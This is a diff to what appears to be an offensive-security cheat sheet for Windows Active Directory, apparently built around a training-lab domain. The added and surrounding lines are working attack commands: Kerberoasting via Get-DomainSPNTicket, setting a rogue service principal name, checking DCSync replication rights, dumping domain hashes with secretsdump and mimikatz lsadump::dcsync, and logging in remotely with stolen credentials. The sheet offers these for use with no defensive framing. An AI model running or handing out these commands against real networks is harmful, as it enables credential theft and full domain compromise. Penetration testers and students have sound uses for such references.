@@ -163,6 +163,7 @@ PS C:\> Get-Domain
 PS C:\> Get-DomainController
 PS C:\> Get-DomainUser
 PS C:\> Get-DomainUser * -spn | select samaccountname
+PS C:\> Get-DomainUser -Identity <username> | select samaccountname,objectsid,memberof,useraccountcontrol |fl
 PS C:\> Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
 PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 PS C:\> Get-DomainUser <username> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
@@ -198,6 +199,8 @@ PS C:\> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -Clear serviceprincipalname -Verbose
 PS C:\> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<username>' -Credential $Cred2 -Verbose
+PS C:\> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+PS C:\> Get-NetLocalGroupMember -ComputerName <computer> -GroupName "Remote Desktop Users"
 ```
 
 - Active Directory Module
@@ -1048,6 +1051,7 @@ C:\> runas /savecred /user:<username> cmd
 
 ```
 PS C:\> Enter-PSSession -ComputerName <computer>
+PS C:\> Enter-PSSession -ComputerName <computer> -Credential $cred
 ```
 
 - Evil-WinRM
@@ -1322,7 +1326,7 @@ PS C:\> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force $
 - Create a SecureString Object
 
 ```
-PS C:\> $damundsenPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+PS C:\> $password = ConvertTo-SecureString '<password>' -AsPlainText -Force
 ```
 
 #5. - Privilege Escalation
@@ -1464,6 +1468,14 @@ $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo wi
 
 ```
 msf> use post/multi/recon/local_exploit_suggester
+```
+
+- PowerUpSQL
+
+```
+https://github.com/netspi/PowerUpSQL
+PS C:\> Get-SQLInstanceDomain
+PS C:\> Get-SQLQuery -Verbose -Instance "<IP address>,1433" -username "<domain>\<username>" -password "<password>" -query 'Select @@version'
 ```
 
 #6. - Brute Force
@@ -1888,6 +1900,7 @@ $ pypykatz lsa minidump lsass.dmp
 $ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 $ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 $ impacket-secretsdump -k -no-pass -dc-ip <DC IP address> -just-dc-user <username> 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+$ secretsdump.py -outputfile <filename> -just-dc INLANEFREIGHT/<username>@<IP address> -use-vss
 ```
 
 - For Loops
@@ -1966,6 +1979,8 @@ mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::sam
 mimikatz # lsadump::lsa /patch
+mimikatz # lsadump::dcsync
+mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\<username>
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::tickets
 mimikatz # kerberos::list
